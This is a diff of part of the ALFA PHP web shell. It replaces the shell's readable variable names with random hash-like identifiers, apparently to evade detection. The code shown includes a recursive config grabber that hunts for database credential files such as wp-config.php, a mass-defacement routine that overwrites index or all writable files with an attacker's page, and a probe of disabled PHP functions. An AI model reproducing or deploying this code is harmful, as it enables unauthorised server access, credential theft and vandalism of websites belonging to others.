-		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$file.'" archive_name="'.basename($file).'" id="archive_dir_'.$rand_id.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
-		echo '<div style="padding: 10px;" id="archive_base_'.$rand_id.'">';
-		__alfa_open_archive_file($file, $rand_id);
+		echo '<hr><div style="margin-left: 12px;" archive_full="phar://'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac.'" archive_name="'.basename($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac).'" id="archive_dir_'.$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d.'" class="archive_dir_holder"><span>PWD: </span><div class="archive_pwd_holder" style="display:inline-block"><a>/</a></div></div>';
+		echo '<div style="padding: 10px;" id="archive_base_'.$acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d.'">';
+		__alfa_open_archive_file($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac, $acfybpuy0d8f750cfdf0ab22480f17fcd46aca1d);
 		echo '</div>';
 	}echo '</div>';
 	alfafooter();
 }
-function __alfa_open_archive_file($arch, $base_id=0){
+function __alfa_open_archive_file($wveevzovd6194c68fcc7e79bb57401be603cb1cc, $ssyvjzcs078dce83ff235666e1056fac71d9e5a5=0){
 	try{
-		$files = array();
-		$dirs = array();
-		$archive = new PharData($arch);
-		 foreach($archive as $file) {
-			 $file_modify = @date('Y-m-d H:i:s', @filemtime($file->getPathname()));
-		     if($file->isDir()) {
-				 $dirs[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "dir", "modify" => $file_modify);
+		$blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array();
+		$rgfoludk33030abc929f083da5f6c3f755b46034 = array();
+		$qcbwnvqx888d0ee361af3603736f32131e7b20a2 = new PharData($wveevzovd6194c68fcc7e79bb57401be603cb1cc);
+		 foreach($qcbwnvqx888d0ee361af3603736f32131e7b20a2 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac) {
+			 $kaetjeum0accdd691149b8182212528c8ed7330c = @date('Y-m-d H:i:s', @filemtime($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname()));
+		     if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->isDir()) {
+				 $rgfoludk33030abc929f083da5f6c3f755b46034[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getFileName(), "path" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname(), "type" => "dir", "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c);
 		     }else{
-				 $file_size = @filesize($file->getPathname());
-				 $files[] = array("name" => $file->getFileName(), "path" => $file->getPathname(), "type" => "file",  "modify" => $file_modify, "size" => $file_size);
+				 $noybsmul234ef73792399c22704f8aef10b14541 = @filesize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname());
+				 $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1[] = array("name" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getFileName(), "path" => $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac->getPathname(), "type" => "file",  "modify" => $kaetjeum0accdd691149b8182212528c8ed7330c, "size" => $noybsmul234ef73792399c22704f8aef10b14541);
 			 }
 		 }
-		 function __alfa_open_archive_usort($a, $b){
-			 return strcmp(strtolower($a['name']), strtolower($b['name']))*1;
+		 function __alfa_open_archive_usort($gtvtgpki0cc175b9c0f1b6a831c399e269772661, $aospafqz92eb5ffee6ae2fec3ad71c777531578f){
+			 return strcmp(strtolower($gtvtgpki0cc175b9c0f1b6a831c399e269772661['name']), strtolower($aospafqz92eb5ffee6ae2fec3ad71c777531578f['name']))*1;
 		 }
-		 usort($dirs, "__alfa_open_archive_usort");
-		 usort($files, "__alfa_open_archive_usort");
-		 $files = array_merge($dirs, $files);
+		 usort($rgfoludk33030abc929f083da5f6c3f755b46034, "__alfa_open_archive_usort");
+		 usort($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1, "__alfa_open_archive_usort");
+		 $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 = array_merge($rgfoludk33030abc929f083da5f6c3f755b46034, $blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1);
 		 echo '<table width="100%" class="main" cellspacing="0" cellpadding="2"><tbody><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>';
-		 $icon = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
-		 echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($arch.'.php').'">'.$icon.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
-		 foreach($files as $file){
-			 $icon = '<img class="archive-icons" src="'.findicon($file['name'],$file['type']).'" width="30" height="30">';
-			 if($file["type"] == "dir"){
-			 	echo '<tr><th><a base_id="'.$base_id.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$file["path"].'" fname="'.$file["name"].'">'.$icon.'<span class="archive-name archive-type-dir">| '.$file["name"].' |</span></a><td>dir</td><td>'.$file["modify"].'</td><td>-</td></tr>';
+		 $pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = '<img class="archive-icons" src="'.findicon('..','dir').'" width="30" height="30">';
+		 echo '<tr><th><a base_id="'.$ssyvjzcs078dce83ff235666e1056fac71d9e5a5.'" class="archive-file-row" fname=".." onclick="alfaOpenArchive(this);" path="'.dirname($wveevzovd6194c68fcc7e79bb57401be603cb1cc.'.php').'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<span class="archive-name archive-type-dir">| .. |</span></a><td>dir</td><td>-</td><td>-</td></tr>';
+		 foreach($blhbqzcb45b963397aa40d4a0063e0d85e4fe7a1 as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+			 $pzbnrxfobaec6461b0d69dde1b861aefbe375d8a = '<img class="archive-icons" src="'.findicon($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['name'],$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac['type']).'" width="30" height="30">';
+			 if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["type"] == "dir"){
+			 	echo '<tr><th><a base_id="'.$ssyvjzcs078dce83ff235666e1056fac71d9e5a5.'" class="archive-file-row" onclick="alfaOpenArchive(this);" path="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["path"].'" fname="'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"].'">'.$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a.'<span class="archive-name archive-type-dir">| '.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"].' |</span></a><td>dir</td><td>'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["modify"].'</td><td>-</td></tr>';
 		 	}else{
-				echo "<tr><th><a base_id='".$base_id."' class='archive-file-row' onclick=\"editor('".$file["path"]."','auto','','','','file');\">".$icon."<span class='archive-name archive-type-file' fname='".$file["name"]."'>".$file["name"]."</span></a><td>".alfaSize($file["size"])."</td><td>".$file["modify"]."</td><td>-</td></tr>";
+				echo "<tr><th><a base_id='".$ssyvjzcs078dce83ff235666e1056fac71d9e5a5."' class='archive-file-row' onclick=\"editor('".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["path"]."','auto','','','','file');\">".$pzbnrxfobaec6461b0d69dde1b861aefbe375d8a."<span class='archive-name archive-type-file' fname='".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"]."'>".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["name"]."</span></a><td>".alfaSize($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["size"])."</td><td>".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac["modify"]."</td><td>-</td></tr>";
 
 			}
 		 }
 		  echo '</table>';
-	}catch(Exception $e){
+	}catch(Exception $qxcuilgde1671797c52e15f763380b45e841ec32){
 		echo("0");
 	}
 }
 function alfaopen_archive_dir(){
-	$dir = $_POST["alfa1"];
-	$base_id = $_POST["alfa2"];
-	__alfa_open_archive_file($dir, $base_id);
+	$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST["alfa1"];
+	$ssyvjzcs078dce83ff235666e1056fac71d9e5a5 = $_POST["alfa2"];
+	__alfa_open_archive_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $ssyvjzcs078dce83ff235666e1056fac71d9e5a5);
 }
 function alfaconfig_grabber(){
 	alfahead();
@@ -5872,30 +5945,30 @@ function alfaconfig_grabber(){
 	Dir: <input size="50" id="target" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
 	Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
 	<input type="submit" name="btn" value=" "></div></form></center><br>';
-	$dir = $_POST['alfa2'];
-	$ext = $_POST['alfa3'];
+	$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
+	$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa3'];
 	if($_POST['alfa5']=='>>'){
 		echo __pre();
-		Alfa_ConfigGrabber($dir, $ext);
+		Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca);
 	}
 	echo '</div>';
 	alfafooter();
 }
-function Alfa_ConfigGrabber($dir, $ext) {
-	$pattern = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
-	$db_files = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
-	if(@is_readable($dir)){
-		$globFiles = @glob("$dir/*.$ext");
-		$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
-		$blacklist = array();
-		foreach ($globDirs as $dir) {
-			if(!@is_readable($dir)||@is_link($dir)) continue;
-			@Alfa_ConfigGrabber($dir, $ext);
+function Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca) {
+	$mztmcsjn240bf022e685b0ee30ad9fe9e1fb5d5b = "#define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,}|define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,}|config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\]|(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")|(?:'|\")(mysql|database)(?:'|\")[ ]{0,}=>[ ]{0,}array|db_name|db_user|db_pass|db_server|db_host|dbhost|dbname|dbuser|dbpass|database_name|database_user|database_pass|mysql_user|mysql_pass|mysqli_connect|mysql_connect|new[ ]{0,}mysqli#i";
+	$pxkqzxoce482c58edd82e04dcbd868fdb186dca5 = array("wp-config.php","configure.php","config.inc.php","configuration.php","config.php","conf.php","dbclass.php","class_core.php","dist-configure.php", "settings.php", "conf_global.php", "db.php", "connect.php", "confing.db.php", "config.db.php", "database.php");
+	if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+		$ghevmcuze3c14af3892a4ccb759e0e4974df197c = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*.$uzehrcsaabf77184f55403d75b9d51d79162a7ca");
+		$ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd  = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*", GLOB_ONLYDIR);
+		$vefebpqna0bc9791616492b14e330a7e0ef35512 = array();
+		foreach ($ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd as $ofvepnxk736007832d2167baaae763fd3a3f3cf1) {
+			if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)||@is_link($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) continue;
+			@Alfa_ConfigGrabber($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca);
 		}
-		foreach ($globFiles as $file){
-			$filee = @file_get_contents($file);
-			if(preg_match($pattern, $filee)){
-				echo "<div><span>$file</span> <a style='cursor:pointer;' onclick=\"editor('".$file."','auto','','','','file');\">[ View file ]</a></div>";
+		foreach ($ghevmcuze3c14af3892a4ccb759e0e4974df197c as $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac){
+			$zprekamg6e07db9a904e1b56ecd015d140691d13 = @file_get_contents($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac);
+			if(preg_match($mztmcsjn240bf022e685b0ee30ad9fe9e1fb5d5b, $zprekamg6e07db9a904e1b56ecd015d140691d13)){
+				echo "<div><span>$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac</span> <a style='cursor:pointer;' onclick=\"editor('".$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac."','auto','','','','file');\">[ View file ]</a></div>";
 			}
 		}
 	}
@@ -5910,13 +5983,13 @@ Method: <select style="width: 18%;" onclick="alfa_searcher_tool(this.value);" na
 Dir: <input size="50" id="target" type="text" name="filename" value="'.$GLOBALS['cwd'].'">
 Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
 <input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['alfa2'];
-$ext = $_POST['alfa3'];
-$method = $_POST['alfa4'];
+$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa3'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa4'];
 if($_POST['alfa5']=='>>'){
 echo __pre();
-if(substr($dir,-1)=='/')$dir=substr($dir,0,-1);
-Alfa_Searcher($dir,trim($ext),$method);
+if(substr($ofvepnxk736007832d2167baaae763fd3a3f3cf1,-1)=='/')$ofvepnxk736007832d2167baaae763fd3a3f3cf1=substr($ofvepnxk736007832d2167baaae763fd3a3f3cf1,0,-1);
+Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,trim($uzehrcsaabf77184f55403d75b9d51d79162a7ca),$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
 }
 }
 if($_POST['alfa1']=='str'){
@@ -5927,12 +6000,12 @@ String: <input type="text" name="string" value="">
 Dir: <input size="50" type="text" name="dir" value="'.$GLOBALS['cwd'].'">
 Ext: <small><font color="red">[ * = all Ext ]</font></small> <input id="ext" style="text-align:center;" type="text" name="ext" size="5" value="php">
 <input type="submit" name="btn" value=" "></div></form></center><br>';
-$dir = $_POST['alfa2'];
-$string = $_POST['alfa3'];
-$ext = $_POST['alfa5'];
-if(!empty($string) AND !empty($dir) AND $_POST['alfa4'] == '>>'){
+$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa2'];
+$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21 = $_POST['alfa3'];
+$uzehrcsaabf77184f55403d75b9d51d79162a7ca = $_POST['alfa5'];
+if(!empty($syvgjxtsb45cffe084dd3d20d928bee85e7b0f21) AND !empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1) AND $_POST['alfa4'] == '>>'){
 echo __pre();
-Alfa_StrSearcher($dir,$string,$ext,$_POST['alfa6']);
+Alfa_StrSearcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$syvgjxtsb45cffe084dd3d20d928bee85e7b0f21,$uzehrcsaabf77184f55403d75b9d51d79162a7ca,$_POST['alfa6']);
 }
 }
 echo '</div>';
@@ -5946,30 +6019,30 @@ echo '<div class="txtfont">Deface Method: <select name="method"><option value="i
 	Mass dir: <input size="50" id="target" type="text" name="massdir" value="'.htmlspecialchars($GLOBALS['cwd']).'">
 	DefPage: <input size="50" type="text" name="defpage" value="'.htmlspecialchars($GLOBALS['cwd']).'"></div> <input type="submit" name="btn" value=" "></center></p>
 </form>';
-$dir = $_POST['alfa1'];
-$defpage = $_POST['alfa2'];
-$method = $_POST['alfa3'];
-$fCurrent = $GLOBALS['__file_path'];
+$ofvepnxk736007832d2167baaae763fd3a3f3cf1 = $_POST['alfa1'];
+$halrheeadb3b348bb48b63e468cf5a6355bd379a = $_POST['alfa2'];
+$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce = $_POST['alfa3'];
+$ftqxgdqada12455c4a8ca8fc5d88a2b95fae6b8c = $GLOBALS['__file_path'];
 if($_POST['alfa4'] == '>>'){
-if(!empty($dir)){
-if(@is_dir($dir)){
-if(@is_readable($dir)){
-if(@is_file($defpage)){
-if($dh = @opendir($dir)){
+if(!empty($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+if(@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+if(@is_file($halrheeadb3b348bb48b63e468cf5a6355bd379a)){
+if($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
 echo __pre();
-while (($file = @readdir($dh)) !== false){
-if($file == '..' || $file == '.')continue;
-$newfile=$dir.$file;
-if($fCurrent == $newfile)continue;
-if(@is_dir($newfile)){
-Alfa_ReadDir($newfile,$method,$defpage);
+while (($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac = @readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc)) !== false){
+if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '..' || $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '.')continue;
+$bftivamya48d2779dabc70e43a053fc28dc9817c=$ofvepnxk736007832d2167baaae763fd3a3f3cf1.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
+if($ftqxgdqada12455c4a8ca8fc5d88a2b95fae6b8c == $bftivamya48d2779dabc70e43a053fc28dc9817c)continue;
+if(@is_dir($bftivamya48d2779dabc70e43a053fc28dc9817c)){
+Alfa_ReadDir($bftivamya48d2779dabc70e43a053fc28dc9817c,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
 }else{
-if(!@is_writable($newfile))continue;
-if(!@is_readable($newfile))continue;
-Alfa_Rewriter($newfile,$file,$defpage,$method);
+if(!@is_writable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
+if(!@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
+Alfa_Rewriter($bftivamya48d2779dabc70e43a053fc28dc9817c,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
 }
 }
-closedir($dh);
+closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
 }else{__alert('<font color="red">Error In OpenDir...</font>');}
 }else{__alert('<font color="red">DefPage File NotFound...</font>');}
 }else{__alert('<font color="red">Directory is not Readable...</font>');}
@@ -5979,265 +6052,265 @@ closedir($dh);
 echo '</div>';
 alfafooter();
 }
-function Alfa_ReadDir($dir,$method='',$defpage=''){
-if(!@is_readable($dir)) return false;
-if (@is_dir($dir)) {
-if ($dh = @opendir($dir)) {
-while(($file=readdir($dh))!==false) {
-if($file == '..' || $file == '.')continue;
-$newfile=$dir.'/'.$file;
-if(@is_readable($newfile)&&@is_dir($newfile))Alfa_ReadDir($newfile,$method,$defpage);
-if(@is_file($newfile)){
-if(!@is_readable($newfile))continue;
-Alfa_Rewriter($newfile,$file,$defpage,$method);
+function Alfa_ReadDir($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce='',$halrheeadb3b348bb48b63e468cf5a6355bd379a=''){
+if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
+if (@is_dir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) {
+if ($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc = @opendir($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) {
+while(($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac=readdir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc))!==false) {
+if($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '..' || $wdyhqgwg8c7dd922ad47494fc02c388e12c00eac == '.')continue;
+$bftivamya48d2779dabc70e43a053fc28dc9817c=$ofvepnxk736007832d2167baaae763fd3a3f3cf1.'/'.$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac;
+if(@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c)&&@is_dir($bftivamya48d2779dabc70e43a053fc28dc9817c))Alfa_ReadDir($bftivamya48d2779dabc70e43a053fc28dc9817c,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
+if(@is_file($bftivamya48d2779dabc70e43a053fc28dc9817c)){
+if(!@is_readable($bftivamya48d2779dabc70e43a053fc28dc9817c))continue;
+Alfa_Rewriter($bftivamya48d2779dabc70e43a053fc28dc9817c,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce);
 }
 }
-closedir($dh);
+closedir($qwysgjpm700f6fa0edb608ee5cc3cfa63f1c94cc);
 }
 }
 }
-function Alfa_Rewriter($dir,$file,$defpage,$m='index'){
-if(!@is_writable($dir)) return false;
-if(!@is_readable($dir)) return false;
-$defpage=@file_get_contents($defpage);
-if($m == 'index'){
-$indexs = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
-if(in_array(strtolower($file),$indexs)){
-@file_put_contents($dir,$defpage);
-echo @is_file($dir)?$dir."<b><font color='red'>DeFaced...</b></font><br>" : '';
+function Alfa_Rewriter($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$wdyhqgwg8c7dd922ad47494fc02c388e12c00eac,$halrheeadb3b348bb48b63e468cf5a6355bd379a,$cnspfppq6f8f57715090da2632453988d9a1501b='index'){
+if(!@is_writable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
+if(!@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)) return false;
+$halrheeadb3b348bb48b63e468cf5a6355bd379a=@file_get_contents($halrheeadb3b348bb48b63e468cf5a6355bd379a);
+if($cnspfppq6f8f57715090da2632453988d9a1501b == 'index'){
+$hewmqjemad9d3113a87b9814d2fe1795bb4e1a73 = array('index.php','index.htm','index.html','default.asp','default.aspx','index.asp','index.aspx','index.js');
+if(in_array(strtolower($wdyhqgwg8c7dd922ad47494fc02c388e12c00eac),$hewmqjemad9d3113a87b9814d2fe1795bb4e1a73)){
+@file_put_contents($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
+echo @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1)?$ofvepnxk736007832d2167baaae763fd3a3f3cf1."<b><font color='red'>DeFaced...</b></font><br>" : '';
 }
-}elseif($m=='all'){
-@file_put_contents($dir,$defpage);
-echo @is_file($dir)?$dir."  <b><font color='red'>DeFaced...</b></font><br>" : '';
+}elseif($cnspfppq6f8f57715090da2632453988d9a1501b=='all'){
+@file_put_contents($ofvepnxk736007832d2167baaae763fd3a3f3cf1,$halrheeadb3b348bb48b63e468cf5a6355bd379a);
+echo @is_file($ofvepnxk736007832d2167baaae763fd3a3f3cf1)?$ofvepnxk736007832d2167baaae763fd3a3f3cf1."  <b><font color='red'>DeFaced...</b></font><br>" : '';
 }
 }
 function alfaGetDisFunc(){
 alfahead();
 echo '<div class="header">';
-$disfun = @ini_get('disable_functions');
-$s = explode(',',$disfun);
-$f = array_unique($s);
+$seoudwvg0b30ee767bb8b426744976e10337f56e = @ini_get('disable_functions');
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034 = explode(',',$seoudwvg0b30ee767bb8b426744976e10337f56e);
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = array_unique($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
 echo '<center><br><b><font color="#7CFC00">Disable Functions</font></b><pre><table border="1"><tr><td align="center" style="background-color: green;color: white;width:5%">#</td><td align="center" style="background-color: green;color: white;">Func Name</td></tr>';
-$i=1;
-foreach($f as $s){
-$s=trim($s);
-if(function_exists($s)||!is_callable($s))continue;
-echo '<tr><td align="center" style="background-color: black;">'.$i.'</td>';
-echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$s).'.php"><span class="disable_functions"><b>'.$s.'</b></span></a></td>';
-$i++;
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;
+foreach($npviloqa8fa14cdd754f91cc6554c9e71929cce7 as $fwekvgvg03c7c0ace395d80182db07ae2c30f034){
+$fwekvgvg03c7c0ace395d80182db07ae2c30f034=trim($fwekvgvg03c7c0ace395d80182db07ae2c30f034);
+if(function_exists($fwekvgvg03c7c0ace395d80182db07ae2c30f034)||!is_callable($fwekvgvg03c7c0ace395d80182db07ae2c30f034))continue;
+echo '<tr><td align="center" style="background-color: black;">'.$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741.'</td>';
+echo '<td align="center" style="background-color: black;"><a style="text-decoration: none;" target="_blank" href="http://php.net/manual/en/function.'.str_replace('_','-',$fwekvgvg03c7c0ace395d80182db07ae2c30f034).'.php"><span class="disable_functions"><b>'.$fwekvgvg03c7c0ace395d80182db07ae2c30f034.'</b></span></a></td>';
+$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++;
 }
 echo '</table></center>';
 echo '</div>';
 alfafooter();
 }
-function Alfa_Create_A_Tag($action,$vals){
-$nulls = array();
-foreach($vals as $key => $val){
-echo '<a href=javascript:void(0) onclick="g(\''.$action.'\',';
-for($i=1;$i<=$val[1]-1;$i++)$nulls[] = 'null';
-$f = implode(',',$nulls);
-echo $f.',\''.$val[0].'\');return false;">| '.$key.' | </a>';
-unset($nulls);
+function Alfa_Create_A_Tag($psxclsvx418c5509e2171d55b0aee5c2ea4442b5,$zedzftuyb2021c4149dfd5dc85c88823b7df34bd){
+$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15 = array();
+foreach($zedzftuyb2021c4149dfd5dc85c88823b7df34bd as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d => $jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf){
+echo '<a href=javascript:void(0) onclick="g(\''.$psxclsvx418c5509e2171d55b0aee5c2ea4442b5.'\',';
+for($brcjlegv865c0c0b4ab0e063e5caa3387c1a8741=1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741<=$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf[1]-1;$brcjlegv865c0c0b4ab0e063e5caa3387c1a8741++)$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15[] = 'null';
+$npviloqa8fa14cdd754f91cc6554c9e71929cce7 = implode(',',$opidwbkuc642c4f3605cc8dc9ae17036b2b66e15);
+echo $npviloqa8fa14cdd754f91cc6554c9e71929cce7.',\''.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf[0].'\');return false;">| '.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.' | </a>';
+unset($opidwbkuc642c4f3605cc8dc9ae17036b2b66e15);
 }
 }
-function Alfa_Searcher($dir, $ext, $method) {
-if(@is_readable($dir)){
-if($method == 'all')$ext = '*';
-if($method == 'dirs')$ext = '*';
-$globFiles = @glob("$dir/*.$ext");
-$globDirs  = @glob("$dir/*", GLOB_ONLYDIR);
-$blacklist = array();
-foreach ($globDirs as $dir) {
-if(!@is_readable($dir)||@is_link($dir)) continue;
-@Alfa_Searcher($dir, $ext, $method);
+function Alfa_Searcher($ofvepnxk736007832d2167baaae763fd3a3f3cf1, $uzehrcsaabf77184f55403d75b9d51d79162a7ca, $qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce) {
+if(@is_readable($ofvepnxk736007832d2167baaae763fd3a3f3cf1)){
+if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'all')$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '*';
+if($qmqhsytzea9f6aca279138c58f705c8d4cb4b8ce == 'dirs')$uzehrcsaabf77184f55403d75b9d51d79162a7ca = '*';
+$ghevmcuze3c14af3892a4ccb759e0e4974df197c = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*.$uzehrcsaabf77184f55403d75b9d51d79162a7ca");
+$ijcmoisj6fb69e88996e72e8fc50e13f205ca4fd  = @glob("$ofvepnxk736007832d2167baaae763fd3a3f3cf1/*", GLOB_ONLYDIR);
+$vefebpqna0bc9791616492b14e330a7e0ef35512 = array();
